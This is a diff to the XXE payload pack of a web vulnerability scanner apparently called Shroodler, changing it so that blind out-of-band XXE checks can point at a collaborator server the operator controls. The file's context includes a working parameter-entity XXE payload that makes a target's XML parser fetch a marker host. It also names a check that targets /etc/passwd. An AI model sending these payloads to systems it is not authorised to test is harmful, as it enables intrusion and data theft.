@@ -6,11 +6,14 @@
 # literal request body with that Content-Type, instead of substituting it
 # into each discovered form field like the other packs.
 #
-# Detection is signature-based (external entity expansion reflected back in
-# the response), the same technique as the path-traversal pack -- there is
-# no out-of-band/collaborator support in this build, so blind XXE (where
-# the result is exfiltrated via an out-of-band channel instead of being
-# echoed in the response) will not be detected. See docs/cli-surface.md.
+# Detection for the two payloads below is signature-based (external entity
+# expansion reflected back in the response), the same technique as the
+# path-traversal pack. The parameter-entity payload at the bottom is
+# genuinely blind (`blind: true`): Shroodler cannot see whether the target's
+# XML parser fetched the marker host, only whether *you* saw it hit your own
+# server. Pass --oob-host to point it at a real collaborator-style server
+# you control, then check that server's logs afterward for the token this
+# run printed in --output's oob_probes list. See docs/cli-surface.md.
 - id: xxe-linux-passwd
   finding_id: payload-xxe
   raw_body: true
@@ -51,17 +54,15 @@
   finding_id: payload-xxe-parameter-entity
   raw_body: true
   content_type: application/xml
+  blind: true
   severity: medium
   description: >-
-    Parameter-entity XXE payload targeting a marker host was sent; this
-    tool cannot observe out-of-band DNS/HTTP callbacks, so a lack of a
-    finding here does NOT mean the target is safe -- check your network
-    logs / DNS provider for a lookup of shroodler-oob-test.invalid if you
-    control that infrastructure, or use a real collaborator tool.
+    Parameter-entity XXE payload targeting a marker host was sent. This is
+    a blind check -- Shroodler cannot observe the callback itself. Pass
+    --oob-host to point the marker at a real server you control, then
+    check its logs for the token recorded in this run's oob_probes list.
+    Without --oob-host this payload is still sent but is unverifiable.
   payload: |
     <?xml version="1.0"?>
     <!DOCTYPE data [<!ENTITY % xxe SYSTEM "http://{{MARKER_HOST}}/xxe">%xxe;]>
     <data>probe</data>
-  match:
-    any:
-      - redirected_to_contains: "shroodler-oob-test.invalid"
